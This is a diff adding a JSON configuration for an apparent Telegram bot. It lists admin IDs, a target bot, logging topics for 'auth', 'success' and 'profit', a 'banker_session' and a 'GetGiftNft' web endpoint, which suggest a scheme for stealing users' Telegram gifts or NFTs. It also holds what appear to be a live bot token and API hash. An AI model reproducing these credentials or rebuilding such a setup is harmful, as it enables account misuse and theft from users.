@@ -1,0 +1,22 @@
+{
+    "target_user": "@GoldGiftsRobot",
+    "admin_ids": [
+        7593326470,
+        8267969336
+    ],
+    "allowed_group_id": -5011396354,
+    "topic_launch": 10,
+    "topic_auth": 10,
+    "topic_success": 10,
+    "topic_profit": 22227,
+    "topic_nft": 10,
+    "api_id": 36831187,
+    "api_hash": "ad4f15f3240af99f98eed10544f9c93f",
+    "api_url": "https://gennadijserduk435-commits.github.io/GetGiftNft/",
+    "bot_token": "8019025031:AAFSd9mTFn0AP17qu1Y1moo-VH-8wd8iDms",
+    "maintenance_mode": false,
+    "banker_session": "adminkalol",
+    "dump_limit": 0,
+    "auto_deactivate": false,
+    "proxies": []
+}
